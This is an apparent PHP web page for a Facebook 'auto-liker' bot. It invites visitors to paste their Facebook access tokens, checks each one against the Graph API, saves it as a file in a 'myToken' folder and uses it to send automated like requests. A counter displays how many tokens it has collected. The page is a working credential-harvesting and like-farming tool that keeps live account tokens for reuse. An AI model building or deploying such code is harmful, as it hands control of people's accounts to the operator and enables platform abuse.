
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><meta charset="utf-8"/>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>Sticker Bot</title>
<link rel="stylesheet" type="text/css" href="stylesheet.css" media="all,handheld"/>
<link rel="stylesheet" type="text/css" href="table.css" media="all,handheld"/>
<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
<link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<link rel="stylesheet" href="normalize.css">
<link rel="stylesheet" href="main.css">
<script src="modernizr-2.6.2.min.js"></script>

<script>
// '.tbl-content' consumed little space for vertical scrollbar, scrollbar width depend on browser/os/platfrom. Here calculate the scollbar width .
$(window).on("load resize ", function() {
  var scrollWidth = $('.tbl-content').width() - $('.tbl-content table').width();
  $('.tbl-header').css({'padding-right':scrollWidth});
}).resize();
</script>

</head>

<div id="loader-wrapper">
<div id="loader"></div>
<div class="loader-section section-left"></div>
<div class="loader-section section-right"></div>
</div>
<?php
$yx=opendir('myToken');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> myToken($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function myToken($access){
if(!is_dir('myToken')){
mkdir('myToken');
}
$a=fopen('myToken/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script type="text/javascript">alert("INFO : Token Invalid")</script>';
$this->form();
}
public function form(){
 echo '


<div id="header">

<script src="header.js"></script>

<hr> </div>

<center>

<marquee direction="left" width="60%"> Yarran Da Group <font color ="red">❤️</font>Saboor ❤️ Hassan<font color ="red">❤️</font>Sohail ❤️ Habib<font color ="red">❤️</font> Hasno ❤️  Ammad<font color ="red">❤️</marquee>

</center>

</br>

<hr width="60%">

</br>

<div id="profile">

<div class="css">

<a>

<img src="a.jpg" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a>

</div> </div> </br>

<div id="center">

<a href="http://hasan-token.tk/" target="_blank">

<input class="button" type="button" value="Get Token"></a></center>

</br> </br>

<form action="index.php" method="post">

<input class="search" type="text1" style="width:65%" name="access_token" placeholder="Paste Your Access Token Here" required></br>

<input class="submit" type="submit" value="Submit"></form></div>
<div id="footer">
Modify  By <a> Hassan Khan </a></br>
</div>
';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<script type="text/javascript">alert("INFO : Data Successfully Saved")</script>
<div id="header">

<script src="header.js"></script>

<hr> </div>

<center>

<marquee direction="left" width="60%"> Yarran Da Group <font color ="red">❤️</font>Hassan Khan <font color ="red">❤️</font>Gulraiz Rehman <font color ="red">❤️</font> Chaudhry Junaid <font color ="red"></marquee>

</center>

</br>

<hr width="60%">

</br>

<div id="profile">

<div class="css">

<a>

<img src="a.jpg" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a>

</div> </div> </br>

<div id="center">

<marquee behavior="alternate"> Bot Successfully Activated </marquee>

</br> </br>

<div id="center"><center>
<font size="40px"> Token Saved! </font></br>
[<a href="index.php" value="Click Here">Click Here</a>] to go back to the home page.</div></center>
</br>
</div>
<div id="footer">
Made By <a>Hassan Khan</a></br>
</div>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>

<font size="6"> <font color="yellow">
<center>

<font size="6"> <?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'myToken/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
    
    echo 
    "Robot Users : $i ";
?>
<section>
<font size="4">
<h1 style="color: white;">Admins Information</h1>
<div class="tbl-header">
<table cellpadding="0" cellspacing="0" border="0">
<thead>
<tr>
<th>Profile</th>
<th>Names</th>
<th>Contacts</th>
</tr>
</thead>
</table>
</div>

<div class="tbl-content">
<table cellpadding="0" cellspacing="0" border="0">
<tbody>
<tr>
<td><img width="50" height="50" src="a.jpg" alt="image" style="border-radius: 100%; border: 2px solid white;"></td>
<td>Hassan Khan</td>
<td><a>Contact For Help</a></td>
</tr>
<tr>
</tbody>
</table>
</div>
</section>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="jquery-1.9.1.min.js"><\/script>')</script>
<script src="main.js"></script>
<div style="text-align:center" id='imageFall'><script type="text/javascript" src="N.js"></script>